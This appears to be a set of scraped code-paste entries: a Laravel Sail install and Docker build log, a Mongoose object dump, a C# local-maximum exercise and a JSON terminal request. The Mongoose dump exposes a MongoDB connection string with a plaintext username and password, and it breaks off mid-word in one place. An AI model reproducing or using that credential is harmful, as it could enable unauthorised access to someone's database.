      - Downloading psr/event-dispatcher (1.0.0)
      - Downloading symfony/event-dispatcher-contracts (v3.4.0)
      - Downloading symfony/event-dispatcher (v7.0.2)
      - Downloading psr/log (3.0.0)
      - Downloading egulias/email-validator (4.0.2)
      - Downloading symfony/mailer (v6.4.2)
      - Downloading symfony/error-handler (v6.4.0)
      - Downloading symfony/http-kernel (v6.4.2)
      - Downloading ramsey/collection (2.0.0)
      - Downloading brick/math (0.11.0)
      - Downloading ramsey/uuid (4.7.5)
      - Downloading nunomaduro/termwind (v1.15.1)
      - Downloading symfony/translation-contracts (v3.4.1)
      - Downloading symfony/translation (v6.4.2)
      - Downloading carbonphp/carbon-doctrine-types (2.1.0)
      - Downloading monolog/monolog (3.5.0)
      - Downloading league/mime-type-detection (1.14.0)
      - Downloading league/flysystem (3.23.0)
      - Downloading league/flysystem-local (3.23.0)
      - Downloading nette/utils (v4.0.3)
      - Downloading nette/schema (v1.2.5)
      - Downloading dflydev/dot-access-data (v3.0.2)
      - Downloading league/config (v1.2.0)
  - Downloading league/commonmark (2.4.1)
      - Downloading laravel/serializable-closure (v1.3.3)
      - Downloading laravel/prompts (v0.1.15)
      - Downloading laravel/framework (v10.41.0)
      - Downloading symfony/yaml (v7.0.0)
      - Downloading laravel/sail (v1.27.1)
      - Downloading laravel/sanctum (v3.3.3)
      - Downloading nikic/php-parser (v5.0.0)
      - Downloading psy/psysh (v0.12.0)
      - Downloading laravel/tinker (v2.9.0)
      - Downloading hamcrest/hamcrest-php (v2.0.1)
      - Downloading mockery/mockery (1.6.7)
      - Downloading filp/whoops (2.15.4)
      - Downloading nunomaduro/collision (v7.10.0)
      - Downloading sebastian/version (4.0.1)
      - Downloading sebastian/type (4.0.0)
      - Downloading sebastian/recursion-context (5.0.0)
      - Downloading sebastian/object-reflector (3.0.0)
      - Downloading sebastian/object-enumerator (5.0.0)
      - Downloading sebastian/global-state (6.0.1)
      - Downloading sebastian/exporter (5.1.1)
      - Downloading sebastian/environment (6.0.1)
      - Downloading sebastian/diff (5.1.0)
      - Downloading sebastian/comparator (5.0.1)
      - Downloading sebastian/code-unit (2.0.0)
      - Downloading sebastian/cli-parser (2.0.0)
      - Downloading phpunit/php-timer (6.0.0)
      - Downloading phpunit/php-text-template (3.0.1)
      - Downloading phpunit/php-invoker (4.0.0)
      - Downloading phpunit/php-file-iterator (4.1.0)
      - Downloading sebastian/lines-of-code (2.0.2)
      - Downloading sebastian/complexity (3.2.0)
      - Downloading sebastian/code-unit-reverse-lookup (3.0.0)
      - Downloading phpunit/php-code-coverage (10.1.11)
      - Downloading phpunit/phpunit (10.5.7)
      - Downloading spatie/backtrace (1.5.3)
      - Downloading spatie/flare-client-php (1.4.3)
      - Downloading spatie/ignition (1.12.0)
      - Downloading spatie/laravel-ignition (2.4.1)
      - Installing doctrine/inflector (2.0.9): Extracting archive
      - Installing doctrine/lexer (3.0.0): Extracting archive
      - Installing symfony/polyfill-ctype (v1.28.0): Extracting archive
      - Installing webmozart/assert (1.11.0): Extracting archive
      - Installing dragonmantank/cron-expression (v3.3.3): Extracting archive
      - Installing symfony/deprecation-contracts (v3.4.0): Extracting archive
      - Installing psr/container (2.0.2): Extracting archive
      - Installing fakerphp/faker (v1.23.1): Extracting archive
      - Installing symfony/polyfill-php80 (v1.28.0): Extracting archive
      - Installing symfony/polyfill-php83 (v1.28.0): Extracting archive
      - Installing symfony/polyfill-mbstring (v1.28.0): Extracting archive
      - Installing symfony/http-foundation (v6.4.2): Extracting archive
      - Installing fruitcake/php-cors (v1.3.0): Extracting archive
      - Installing psr/http-message (2.0): Extracting archive
      - Installing psr/http-client (1.0.3): Extracting archive
      - Installing ralouphie/getallheaders (3.0.3): Extracting archive
      - Installing psr/http-factory (1.0.2): Extracting archive
      - Installing guzzlehttp/psr7 (2.6.2): Extracting archive
      - Installing guzzlehttp/promises (2.0.2): Extracting archive
      - Installing guzzlehttp/guzzle (7.8.1): Extracting archive
      - Installing guzzlehttp/uri-template (v1.0.3): Extracting archive
      - Installing laravel/pint (v1.13.9): Extracting archive
      - Installing symfony/polyfill-intl-normalizer (v1.28.0): Extracting archive
      - Installing symfony/polyfill-intl-grapheme (v1.28.0): Extracting archive
      - Installing symfony/string (v7.0.2): Extracting archive
      - Installing symfony/service-contracts (v3.4.1): Extracting archive
      - Installing symfony/console (v6.4.2): Extracting archive
      - Installing voku/portable-ascii (2.0.1): Extracting archive
      - Installing phpoption/phpoption (1.9.2): Extracting archive
      - Installing graham-campbell/result-type (v1.1.2): Extracting archive
      - Installing vlucas/phpdotenv (v5.6.0): Extracting archive
      - Installing symfony/css-selector (v7.0.0): Extracting archive
      - Installing tijsverkoyen/css-to-inline-styles (v2.2.7): Extracting archive
      - Installing symfony/var-dumper (v6.4.2): Extracting archive
      - Installing symfony/polyfill-uuid (v1.28.0): Extracting archive
      - Installing symfony/uid (v6.4.0): Extracting archive
      - Installing symfony/routing (v6.4.2): Extracting archive
      - Installing symfony/process (v6.4.2): Extracting archive
      - Installing symfony/polyfill-php72 (v1.28.0): Extracting archive
      - Installing symfony/polyfill-intl-idn (v1.28.0): Extracting archive
      - Installing symfony/mime (v6.4.0): Extracting archive
      - Installing psr/event-dispatcher (1.0.0): Extracting archive
      - Installing symfony/event-dispatcher-contracts (v3.4.0): Extracting archive
      - Installing symfony/event-dispatcher (v7.0.2): Extracting archive
      - Installing psr/log (3.0.0): Extracting archive
      - Installing egulias/email-validator (4.0.2): Extracting archive
      - Installing symfony/mailer (v6.4.2): Extracting archive
      - Installing symfony/error-handler (v6.4.0): Extracting archive
      - Installing symfony/http-kernel (v6.4.2): Extracting archive
      - Installing symfony/finder (v6.4.0): Extracting archive
      - Installing ramsey/collection (2.0.0): Extracting archive
      - Installing brick/math (0.11.0): Extracting archive
      - Installing ramsey/uuid (4.7.5): Extracting archive
      - Installing psr/simple-cache (3.0.0): Extracting archive
      - Installing nunomaduro/termwind (v1.15.1): Extracting archive
      - Installing symfony/translation-contracts (v3.4.1): Extracting archive
      - Installing symfony/translation (v6.4.2): Extracting archive
      - Installing psr/clock (1.0.0): Extracting archive
      - Installing carbonphp/carbon-doctrine-types (2.1.0): Extracting archive
      - Installing nesbot/carbon (2.72.1): Extracting archive
      - Installing monolog/monolog (3.5.0): Extracting archive
      - Installing league/mime-type-detection (1.14.0): Extracting archive
      - Installing league/flysystem (3.23.0): Extracting archive
      - Installing league/flysystem-local (3.23.0): Extracting archive
      - Installing nette/utils (v4.0.3): Extracting archive
      - Installing nette/schema (v1.2.5): Extracting archive
      - Installing dflydev/dot-access-data (v3.0.2): Extracting archive
      - Installing league/config (v1.2.0): Extracting archive
      - Installing league/commonmark (2.4.1): Extracting archive
      - Installing laravel/serializable-closure (v1.3.3): Extracting archive
      - Installing laravel/prompts (v0.1.15): Extracting archive
      - Installing laravel/framework (v10.41.0): Extracting archive
      - Installing symfony/yaml (v7.0.0): Extracting archive
      - Installing laravel/sail (v1.27.1): Extracting archive
      - Installing laravel/sanctum (v3.3.3): Extracting archive
      - Installing nikic/php-parser (v5.0.0): Extracting archive
      - Installing psy/psysh (v0.12.0): Extracting archive
      - Installing laravel/tinker (v2.9.0): Extracting archive
      - Installing hamcrest/hamcrest-php (v2.0.1): Extracting archive
      - Installing mockery/mockery (1.6.7): Extracting archive
      - Installing filp/whoops (2.15.4): Extracting archive
      - Installing nunomaduro/collision (v7.10.0): Extracting archive
      - Installing sebastian/version (4.0.1): Extracting archive
      - Installing sebastian/type (4.0.0): Extracting archive
      - Installing sebastian/recursion-context (5.0.0): Extracting archive
      - Installing sebastian/object-reflector (3.0.0): Extracting archive
      - Installing sebastian/object-enumerator (5.0.0): Extracting archive
      - Installing sebastian/global-state (6.0.1): Extracting archive
      - Installing sebastian/exporter (5.1.1): Extracting archive
      - Installing sebastian/environment (6.0.1): Extracting archive
      - Installing sebastian/diff (5.1.0): Extracting archive
      - Installing sebastian/comparator (5.0.1): Extracting archive
      - Installing sebastian/code-unit (2.0.0): Extracting archive
      - Installing sebastian/cli-parser (2.0.0): Extracting archive
      - Installing phpunit/php-timer (6.0.0): Extracting archive
      - Installing phpunit/php-text-template (3.0.1): Extracting archive
      - Installing phpunit/php-invoker (4.0.0): Extracting archive
      - Installing phpunit/php-file-iterator (4.1.0): Extracting archive
      - Installing theseer/tokenizer (1.2.2): Extracting archive
      - Installing sebastian/lines-of-code (2.0.2): Extracting archive
      - Installing sebastian/complexity (3.2.0): Extracting archive
      - Installing sebastian/code-unit-reverse-lookup (3.0.0): Extracting archive
      - Installing phpunit/php-code-coverage (10.1.11): Extracting archive
      - Installing phar-io/version (3.2.1): Extracting archive
      - Installing phar-io/manifest (2.0.3): Extracting archive
      - Installing myclabs/deep-copy (1.11.1): Extracting archive
      - Installing phpunit/phpunit (10.5.7): Extracting archive
      - Installing spatie/backtrace (1.5.3): Extracting archive
      - Installing spatie/flare-client-php (1.4.3): Extracting archive
      - Installing spatie/ignition (1.12.0): Extracting archive
      - Installing spatie/laravel-ignition (2.4.1): Extracting archive
    55 package suggestions were added by new dependencies, use `composer suggest` to see details.
    Generating optimized autoload files
    > Illuminate\Foundation\ComposerScripts::postAutoloadDump
    > @php artisan package:discover --ansi

   INFO  Discovering packages.

      laravel/sail     ..........................................................     DONE
  laravel/sanctum     .......................................................     DONE
  laravel/tinker     ........................................................     DONE
      nesbot/carbon     .........................................................     DONE
  nunomaduro/collision     ..................................................     DONE
  nunomaduro/termwind     ...................................................     DONE
  spatie/laravel-ignition     ...............................................     DONE

    83 packages you are using are looking for funding.
Use the `composer fund` command to find out more!
    > @php artisan vendor:publish --tag=laravel-assets --ansi --force

   INFO  No publishable resources for tag [laravel-assets].

    No security vulnerability advisories found.
    > @php artisan key:generate --ansi

   INFO  Application key set successfully.

   INFO  Application ready in [example-app]. Build something amazing.

Sail scaffolding installed successfully.
   WARN  TTY mode requires /dev/tty to be read/writable.

[+] Pulling 65/5
 ✔ mailpit 3 layers [⣿⣿⣿]      0B/0B      Pulled                                                                 423.8s
 ✔ selenium 38 layers [⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿]      0B/0B      Pulled                            429.6s
 ✔ meilisearch 6 layers [⣿⣿⣿⣿⣿⣿]      0B/0B      Pulled                                                          270.6s
 ✔ mysql 7 layers [⣿⣿⣿⣿⣿⣿⣿]      0B/0B      Pulled                                                               423.5s
 ✔ redis 6 layers [⣿⣿⣿⣿⣿⣿]      0B/0B      Pulled                                                                435.7s
[+] Building 949.8s (16/16) FINISHED                                                                     docker:default
 => [laravel.test internal] load build definition from Dockerfile                                                  0.1s
 => => transferring dockerfile: 3.21kB                                                                             0.0s
 => [laravel.test internal] load .dockerignore                                                                     0.1s
 => => transferring context: 2B                                                                                    0.0s
 => [laravel.test internal] load metadata for docker.io/library/ubuntu:22.04                                       4.6s
 => [laravel.test  1/11] FROM docker.io/library/ubuntu:22.04@sha256:dcd7ed8cfc7fd38ad9f7bf550263e626982e5daa7be0  15.5s
 => => resolve docker.io/library/ubuntu:22.04@sha256:dcd7ed8cfc7fd38ad9f7bf550263e626982e5daa7be0b2d5132130a478ec  0.0s
 => => sha256:dcd7ed8cfc7fd38ad9f7bf550263e626982e5daa7be0b2d5132130a478ecda9b 1.13kB / 1.13kB                     0.0s
 => => sha256:cb2af41f42b9c9bc9bcdc7cf1735e3c4b3d95b2137be86fd940373471a34c8b0 424B / 424B                         0.0s
 => => sha256:e34e831650c1bb0be9b6f61c6755749cb8ea2053ba91c6cda27fded9e089811f 2.30kB / 2.30kB                     0.0s
 => => sha256:29202e855b2021a2d7f92800619ed5f5e8ac402e267cfbb3d29a791feb13c1ee 29.55MB / 29.55MB                  14.4s
 => => extracting sha256:29202e855b2021a2d7f92800619ed5f5e8ac402e267cfbb3d29a791feb13c1ee                          1.0s
 => [laravel.test internal] load build context                                                                     0.0s
 => => transferring context: 847B                                                                                  0.0s
 => [laravel.test  2/11] WORKDIR /var/www/html                                                                     0.2s
 => [laravel.test  3/11] RUN ln -snf /usr/share/zoneinfo/UTC /etc/localtime && echo UTC > /etc/timezone            0.3s
 => [laravel.test  4/11] RUN apt-get update     && mkdir -p /etc/apt/keyrings     && apt-get install -y gnupg g  922.1s
 => [laravel.test  5/11] RUN setcap ""cap_net_bind_service=+ep"" /usr/bin/php8.3                                     0.4s
 => [laravel.test  6/11] RUN groupadd --force -g 1001 sail                                                         0.4s
 => [laravel.test  7/11] RUN useradd -ms /bin/bash --no-user-group -g 1001 -u 1337 sail                            0.5s
 => [laravel.test  8/11] COPY start-container /usr/local/bin/start-container                                       0.0s
 => [laravel.test  9/11] COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf                             0.0s
 => [laravel.test 10/11] COPY php.ini /etc/php/8.3/cli/conf.d/99-sail.ini                                          0.0s
 => [laravel.test 11/11] RUN chmod +x /usr/local/bin/start-container                                               0.4s
 => [laravel.test] exporting to image                                                                              5.1s
 => => exporting layers                                                                                            5.0s
 => => writing image sha256:7056770414b945f682a2f012a999b70f26e3f9d7c83c6478a7fa332259064c9f                       0.0s
 => => naming to sail-8.3/app                                                                                      0.0s

Please provide your password so we can make some final adjustments to your application's permissions.

[sudo] password for user:

Thank you! We hope you build something incredible. Dive in with: cd example-app && ./vendor/bin/sail up"
3c76V7nv,Express wrong route errors,IRONFIST001,JSON,Friday 19th of January 2024 01:51:20 AM CDT,"            schemaName: 'Number',       
            defaultOptions: {},
            _checkRequired: [Function (anonymous)],
            checkRequired: [Function (anonymous)]
          },        
          Error: [class MongooseError extends Error] {      
            messages: [Object],
            Messages: [Object],
            DocumentNotFoundError: [class DocumentNotFoundError extends MongooseError],
            CastError: [class CastError extends MongooseError],
            ValidationError: [class ValidationError extends MongooseError],     
            ValidatorError: [class ValidatorError extends MongooseError],       
            VersionError: [class VersionError extends MongooseError],
            ParallelSaveError: [class ParallelSaveError extends MongooseError], 
            OverwriteModelError: [class OverwriteModelError extends MongooseError],
            MissingSchemaError: [class MissingSchemaError extends MongooseError],
            MongooseServerSelectionError: [class MongooseServerSelectionError extends MongooseError],
            DivergentArrayError: [class DivergentArrayError extends MongooseError],
            StrictModeError: [class StrictModeError extends MongooseError],     
            StrictPopulateError: [class StrictPopulateError extends MongooseError]
          },        
          MongooseError: [class MongooseError extends Error] {
            messages: [Object],
            Messages: [Object],
            DocumentNotFoundError: [class DocumentNotFoundError extends MongooseError],
            CastError: [class CastError extends MongooseError],
            ValidationError: [class ValidationError extends MongooseError],     
            ValidatorError: [class ValidatorError extends MongooseError],       
            VersionError: [class VersionError extends MongooseError],
            ParallelSaveError: [class ParallelSaveError extends MongooseError], 
            OverwriteModelError: [class OverwriteModelError extends MongooseError],
            MissingSchemaError: [class MissingSchemaError extends MongooseError],
            MongooseServerSelectionError: [class MongooseServerSelectionError extends MongooseError],
            DivergentArrayError: [class DivergentArrayError extends MongooseError],
            StrictModeError: [class StrictModeError extends MongooseError],     
            StrictPopulateError: [class StrictPopulateError extends MongooseError]
          },        
          now: [Function: now],
          CastError: [class CastError extends MongooseError],
          SchemaTypeOptions: [class SchemaTypeOptions],     
          mongo: {  
            BSON: [Getter],
            Binary: [Getter],
            BSONRegExp: [Getter],       
            BSONSymbol: [Getter],       
            BSONType: [Getter],
            Code: [Getter],
            DBRef: [Getter],
            Decimal128: [Getter],       
            Double: [Getter],
            Int32: [Getter],
            Long: [Getter],
            MaxKey: [Getter],
            MinKey: [Getter],
            ObjectId: [Getter],
            Timestamp: [Getter],        
            UUID: [Getter],
            MongoBulkWriteError: [Getter],
            ClientEncryption: [Getter], 
            ChangeStreamCursor: [Getter],
            MongoAPIError: [Getter],    
            MongoAWSError: [Getter],    
            MongoAzureError: [Getter],  
            MongoBatchReExecutionError: [Getter],
            MongoChangeStreamError: [Getter],
            MongoCompatibilityError: [Getter],
            MongoCursorExhaustedError: [Getter],
            MongoCursorInUseError: [Getter],
            MongoDecompressionError: [Getter],
            MongoDriverError: [Getter], 
            MongoError: [Getter],       
            MongoExpiredSessionError: [Getter],
            MongoGridFSChunkError: [Getter],
            MongoGridFSStreamError: [Getter],
            MongoInvalidArgumentError: [Getter],
            MongoKerberosError: [Getter],
            MongoMissingCredentialsError: [Getter],
            MongoMissingDependencyError:
 [Getter],
            MongoNetworkError: [Getter],
            MongoNetworkTimeoutError: [Getter],
            MongoNotConnectedError: [Getter],
            MongoParseError: [Getter],  
            MongoRuntimeError: [Getter],
            MongoServerClosedError: [Getter],
            MongoServerError: [Getter], 
            MongoServerSelectionError: [Getter],
            MongoSystemError: [Getter], 
            MongoTailableCursorError: [Getter],
            MongoTopologyClosedError: [Getter],
            MongoTransactionError: [Getter],
            MongoUnexpectedServerResponseError: [Getter],   
            MongoWriteConcernError: [Getter],
            AbstractCursor: [Getter],   
            Admin: [Getter],
            AggregationCursor: [Getter],
            CancellationToken: [Getter],
            ChangeStream: [Getter],     
            ClientSession: [Getter],    
            Collection: [Getter],       
            Db: [Getter],
            FindCursor: [Getter],       
            GridFSBucket: [Getter],     
            GridFSBucketReadStream: [Getter],
            GridFSBucketWriteStream: [Getter],
            ListCollectionsCursor: [Getter],
            ListIndexesCursor: [Getter],
            MongoClient: [Getter],      
            OrderedBulkOperation: [Getter],
            UnorderedBulkOperation: [Getter],
            BatchType: [Getter],        
            AutoEncryptionLoggerLevel: [Getter],
            GSSAPICanonicalizationValue:
 [Getter],
            AuthMechanism: [Getter],    
            Compressor: [Getter],       
            CURSOR_FLAGS: [Getter],     
            MongoErrorLabel: [Getter],  
            ExplainVerbosity: [Getter], 
            ServerApiVersion: [Getter], 
            ReturnDocument: [Getter],   
            ProfilingLevel: [Getter],   
            ReadConcernLevel: [Getter], 
            ReadPreferenceMode: [Getter],
            ServerType: [Getter],       
            TopologyType: [Getter],     
            ReadConcern: [Getter],      
            ReadPreference: [Getter],   
            WriteConcern: [Getter],     
            CommandFailedEvent: [Getter],
            CommandStartedEvent: [Getter],
            CommandSucceededEvent: [Getter],
            ConnectionCheckedInEvent: [Getter],
            ConnectionCheckedOutEvent: [Getter],
            ConnectionCheckOutFailedEvent: [Getter],        
            ConnectionCheckOutStartedEvent: [Getter],       
            ConnectionClosedEvent: [Getter],
            ConnectionCreatedEvent: [Getter],
            ConnectionPoolClearedEvent: [Getter],
            ConnectionPoolClosedEvent: [Getter],
            ConnectionPoolCreatedEvent: [Getter],
            ConnectionPoolMonitoringEvent: [Getter],        
            ConnectionPoolReadyEvent: [Getter],
            ConnectionReadyEvent: [Getter],
            ServerClosedEvent: [Getter],
            ServerDescriptionChangedEvent: [Getter],        
            ServerHeartbeatFailedEvent: [Getter],
            ServerHeartbeatStartedEvent:
 [Getter],
            ServerHeartbeatSucceededEvent: [Getter],        
            ServerOpeningEvent: [Getter],
            TopologyClosedEvent: [Getter],
            TopologyDescriptionChangedEvent: [Getter],      
            TopologyOpeningEvent: [Getter],
            SrvPollingEvent: [Getter],  
            MongoCryptAzureKMSRequestError: [Getter],       
            MongoCryptCreateDataKeyError: [Getter],
            MongoCryptCreateEncryptedCollectionError: [Getter],
            MongoCryptError: [Getter],  
            MongoCryptInvalidArgumentError: [Getter],       
            MongoCryptKMSRequestNetworkTimeoutError: [Getter]
          },        
          mquery: [Function: Query] {   
            permissions: [Object],      
            _isPermitted: [Function (anonymous)],
            canMerge: [Function (anonymous)],
            setGlobalTraceFunction: [Function (anonymous)], 
            utils: [Object],
            env: [Object],
            Collection: [class NodeCollection extends Collection],
            BaseCollection: [Function]  
          },        
          sanitizeFilter: [Function: sanitizeFilter],       
          trusted: [Function: trusted], 
          skipMiddlewareFunction: [Function: skipWrappedFunction],
          overwriteMiddlewareResult: [Function: overwriteResult]
        },
        collections: { products: [Circular *5] },
        models: { Product: [Circular *2] },
        config: {}, 
        replica: false,
        options: null,
        otherDbs: [],
        relatedDbs: {},
        states: [Object: null prototype] {
          '0': 'disconnected',
          '1': 'connected',
          '2': 'connecting',
          '3': 'disconnecting',
          '99': 'uninitialized',        
          disconnected: 0,
          connected:
 1,
          connecting: 2,
          disconnecting: 3,
          uninitialized: 99
        },
        _readyState:
 1,
        _closeCalled: undefined,        
        _hasOpened: true,
        plugins: [],
        id: 0,      
        _queue: [], 
        _listening: false,
        _connectionOptions: { driverInfo: { name: 'Mongoose', version: '8.0.4' } },
        '$dbName': 'Ecommerce_Backend', 
        _connectionString: 'mongodb+srv://rahullalwani:rahul102002@ecommerce.8lybr5j.mongodb.net/?retryWrites=true',    
        client: <ref *4> MongoClient {  
          _events: [Object: null prototype] {
            topologyDescriptionChanged: [Function (anonymous)]
          },        
          _eventsCount: 1,
          _maxListeners: 0,
          mongoLogger: MongoLogger {    
            error: [Function: bound log],
            warn: [Function: bound log],
            info: [Function: bound log],
            debug: [Function: bound log],
            trace: [Function: bound log],
            componentSeverities: [Object],
            maxDocumentLength: 1000,    
            logDestination: [Object]    
          },        
          s: {      
            url: 'mongodb+srv://rahullalwani:rahul102002@ecommerce.8lybr5j.mongodb.net/?retryWrites=true',
            bsonOptions: [Object],      
            namespace: [MongoDBNamespace],
            hasBeenClosed: false,       
            sessionPool: [ServerSessionPool],
            activeSessions: Set(0) {},  
            options:
 [Getter],
            readConcern: [Getter],      
            writeConcern: [Getter],     
            readPreference: [Getter],   
            isMongoClient: [Getter]     
          },        
          connectionLock: undefined,    
          topology: Topology {
            _events: [Object: null prototype],
            _eventsCount: 26,
            _maxListeners: undefined,   
            client: [Circular *4],      
            selectServerAsync: [Function (anonymous)],      
            s: [Object],
            [Symbol(kCapture)]: false,  
            [Symbol(waitQueue)]: [List] 
          },        
          [Symbol(kCapture)]: false,    
          [Symbol(options)]: [Object: null prototype] {     
            hosts: [Array],
            credentials: [MongoCredentials],
            compressors: [Array],       
            connectTimeoutMS: 30000,    
            directConnection: false,    
            driverInfo: [Object],       
            enableUtf8Validation: true, 
            forceServerObjectId: false, 
            heartbeatFrequencyMS: 10000,
            loadBalanced: false,        
            localThresholdMS: 15,       
            maxConnecting: 2,
            maxIdleTimeMS: 0,
            maxPoolSize: 100,
            minPoolSize: 0,
            minHeartbeatFrequencyMS: 500,
            monitorCommands: false,     
            noDelay:
 true,
            pkFactory: [Object],        
            raw: false,
            readPreference: [ReadPreference],
            retryReads: true,
            retryWrites: true,
            serverSelectionTimeoutMS: 30000,
            socketTimeoutMS: 0,
            srvMaxHosts: 0,
            srvServiceName: 'mongodb',  
            waitQueueTimeoutMS: 0,      
            zlibCompressionLevel: 0,    
            dbName: 'test',
            userSpecifiedAuthSource: false,
            userSpecifiedReplicaSet: false,
            srvHost: 'ecommerce.8lybr5j.mongodb.net',       
            tls: true,
            mongoLoggerOptions: [Object],
            metadata: [Object],
            replicaSet: 'atlas-ozqfoq-shard-0',
            [Symbol(@@mdb.enableMongoLogger)]: false        
          }
        },
        '$initialConnection': Promise { [Circular *3] },    
        db: Db {    
          s: {      
            options:
 [Object],
            readPreference: [ReadPreference],
            bsonOptions: [Object],      
            pkFactory: [Object],        
            readConcern: undefined,     
            writeConcern: undefined,    
            namespace: [MongoDBNamespace]
          },        
          client: <ref *4> MongoClient {
            _events: [Object: null prototype],
            _eventsCount: 1,
            _maxListeners: 0,
            mongoLogger: [MongoLogger], 
            s: [Object],
            connectionLock: undefined,  
            topology: [Topology],       
            [Symbol(kCapture)]: false,  
            [Symbol(options)]: [Object: null prototype]     
          }
        },
        host: 'ac-u44yps1-shard-00-00.8lybr5j.mongodb.net', 
        port: 27017,
        name: 'Ecommerce_Backend'       
      },
      queue: [],    
      buffer: false,
      emitter: EventEmitter {
        _events: [Object: null prototype] {},
        _eventsCount: 0,
        _maxListeners: undefined,       
        [Symbol(kCapture)]: false       
      }
    },
    Query: [Function (anonymous)] {     
      base: {       
        toConstructor: [Function: toConstructor],
        setOptions: [Function (anonymous)],
        collection: [Function: collection],
        collation: [Function (anonymous)],
        '$where': [Function (anonymous)],
        where: [Function (anonymous)],  
        equals: [Function: equals],     
        eq: [Function: eq],
        or: [Function: or],
        nor: [Function: nor],
        and: [Function: and],
        gt: [Function (anonymous)],     
        gte: [Function (anonymous)],    
        lt: [Function (anonymous)],     
        lte: [Function (anonymous)],    
        ne: [Function (anonymous)],     
        in: [Function (anonymous)],     
        nin: [Function (anonymous)],    
        all: [Function (anonymous)],    
        regex: [Function (anonymous)],  
        size: [Function (anonymous)],   
        maxDistance: [Function (anonymous)],
        minDistance: [Function (anonymous)],
        mod: [Function (anonymous)],    
        exists: [Function (anonymous)], 
        elemMatch: [Function (anonymous)],
        within: [Function: within],     
        box: [Function (anonymous)],    
        polygon: [Function (anonymous)],
        circle: [Function (anonymous)], 
        near: [Function: near],
        intersects: [Function: intersects],
        geometry: [Function: geometry], 
        select: [Function: select],     
        slice: [Function (anonymous)],  
        sort: [Function (anonymous)],   
        limit: [Function (anonymous)],  
        skip: [Function (anonymous)],   
        batchSize: [Function (anonymous)],
        comment: [Function (anonymous)],
        maxTimeMS: [Function (anonymous)],
        maxTime: [Function (anonymous)],
        hint: [Function (anonymous)],   
        j: [Function: j],
        slaveOk: [Function (anonymous)],
        setReadPreference: [Function (anonymous)],
        read: [Function (anonymous)],   
        r: [Function (anonymous)],      
        readConcern: [Function (anonymous)],
        tailable: [Function (anonymous)],
        w: [Function: writeConcern],    
        writeConcern: [Function: writeConcern],
        wTimeout: [Function: wtimeout], 
        wtimeout: [Function: wtimeout], 
        merge: [Function (anonymous)],  
        find: [Function (anonymous)],   
        _find: [AsyncFunction: _find],  
unction: selected],
        selectedInclusively: [Function: selectedInclusively],
        selectedExclusively: [Function: selectedExclusively],
        _mergeUpdate: [Function (anonymous)],
        _optionsForExec: [Function (anonymous)],
        _fieldsForExec: [Function (anonymous)],
        _updateForExec: [Function (anonymous)],
        _ensurePath: [Function (anonymous)],
        _validate: [Function (anonymous)]
      }
    },
    '$init': Promise { undefined, catch: [Function (anonymous)] },
    '$caught': true,    [Symbol(mongoose#Model)]: true
  }
}"
FM5v5879,C#_3_local_max_element,Legiomax,C#,Friday 19th of January 2024 01:37:32 AM CDT,"using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace C_Ijun
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Random random = new Random();

            int lowRangeArray = 0;
            int highRangeArray = 30;
            int lowRangeRandom = 0;
            int highRangeRandom = 10;

            int rangeArray = random.Next(lowRangeArray, highRangeArray);
            int[] numbers = new int[rangeArray];

            int leftBorderArrayIndex = lowRangeArray;
            int rightBorderArrayIndex = rangeArray - 1;

            bool hasLocalMaxElement = false;

            if (rangeArray == 0)
            {
                Console.WriteLine(""Массив нулевого размера\nЗдесь нечего смотреть, уходи"");
            }
            else
            {
                for (int i = 0; i < rangeArray; i++)
                {
                    numbers[i] = random.Next(lowRangeRandom, highRangeRandom);
                }

                Console.WriteLine(""Исходная матрица\n"");

                for (int i = 0; i < rangeArray; i++)
                {
                    Console.Write(numbers[i] + "" "");
                }

                if (rangeArray == 1)
                {
                    Console.Write($""\nЛокальный максимум - {numbers[0]}"");
                }
                else
                {
                    if (numbers[leftBorderArrayIndex] > numbers[leftBorderArrayIndex + 1])
                    {
                        Console.Write($""\nЛокальный максимум - {numbers[leftBorderArrayIndex]}"");
                        hasLocalMaxElement = true;
                    }

                    for (int i = leftBorderArrayIndex + 1; i < rightBorderArrayIndex; i++)
                    {
                        if (numbers[i - 1] < numbers[i] && numbers[i + 1] < numbers[i])
                        {
                            Console.Write($""\nЛокальный максимум - {numbers[i]}"");
                            hasLocalMaxElement = true;
                            i++;
                        }
                    }

                    if (numbers[rightBorderArrayIndex] > numbers[rightBorderArrayIndex - 1])
                    {
                        Console.Write($""\nЛокальный максимум - {numbers[rightBorderArrayIndex]}"");
                        hasLocalMaxElement = true;
                    }

                    if (hasLocalMaxElement is false)
                    {
                        Console.WriteLine(""\nЛокальных максимумов нет"");
                    }
                }
            }
            Console.ReadKey();
        }
    }
}
"
LgC7Jtq7,Untitled,vladislav_larionov,JSON,Friday 19th of January 2024 12:31:10 AM CDT,"{
  ""GIN2"": {
    ""INFO"": {
      ""ReqPPPInfo"": {
        ""parameterName"": ""%"",
        ""RRights"": {
          ""name"": [
            ""GIN_PPPINFO""
          ]
        }
      }
    },
    ""META-INF"": {
      ""ENTRY"": [
        {
          ""name"": ""PI"",
          ""value"": ""FSGMOBILEPOST""
        },
        {
          ""name"": ""DOMAIN"",
          ""value"": ""WINPOST""
        },
        {
          ""name"": ""TERMINAL"",
          ""value"": ""67500075""
        },
        {
          ""name"": ""VERSION"",
          ""value"": ""24.2.0.1""
        },
        {
          ""name"": ""REQ_ID"",
          ""value"": ""67500075_30b02e12-73fd-415a-a371-13b121c8f24e""
        },
        {
          ""name"": ""termID"",
          ""value"": ""PETROV""
        },
        {
          ""name"": ""TOKENU"",
          ""value"": ""BLG_675000_PETROV""
        },
        {
          ""name"": ""TOKENP"",
          ""value"": ""356A192B7913B04C5457********************""
        }
      ]
    }
  }
}"
